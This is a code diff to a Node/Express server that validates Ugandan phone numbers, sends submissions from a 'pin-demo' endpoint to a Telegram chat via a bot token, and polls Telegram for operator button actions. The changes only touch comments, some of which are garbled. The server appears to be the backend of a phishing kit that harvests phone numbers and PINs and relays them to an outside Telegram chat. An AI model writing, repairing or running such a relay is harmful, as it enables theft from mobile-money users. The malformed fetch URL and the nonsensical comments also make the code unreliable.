@@ -21,7 +21,6 @@ const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const requests = new Map();
 
-// Background token manager to clear old sessions
 setInterval(() => {
   const now = Date.now();
   for (const [id, data] of requests.entries()) {
@@ -34,7 +33,6 @@ setInterval(() => {
 async function telegram(method, payload) {
   if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
   
-  // ✅ Uses the native runtime global fetch engine automatically
   const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -42,14 +40,14 @@ async function telegram(method, payload) {
   });
   
   const data = await res.json();
-  if (!res.ok || !data.ok) throw new Error(data.description || "Telegram communication failed.");
+  if (!res.ok || !data.ok) throw new Error(data.description || "Telegram failed.");
   return data;
 }
 
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
-  // ✅ Fixed Regex: Evaluates exactly 9 digits starting with 7
+  // ✅ Fixed regular expression with clear absolute bounds match matching input numbers
   if (!/^\+2567\d{8}$/.test(phone)) {
     return res.status(400).json({ error: "Invalid format phone number." });
   }
@@ -70,7 +68,6 @@ app.post("/api/pin-demo", async (req, res) => {
   const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
   
   try {
-    // ✅ Formatted message structure matching your target layout parameters
     await telegram("sendMessage", {
       chat_id: CHAT_ID,
       text: [
@@ -134,7 +131,7 @@ async function pollTelegram() {
         if (!cb) continue;
         
         const parts = String(cb.data || "").split(":");
-        // ✅ Fixed Indexing: Captures the precise option string value at position 0
+        // ✅ Fixed Array access index string assignment notation bug
         const action = parts[0]; 
         const reqId = parts.slice(1).join(":");
         const request = requests.get(reqId);
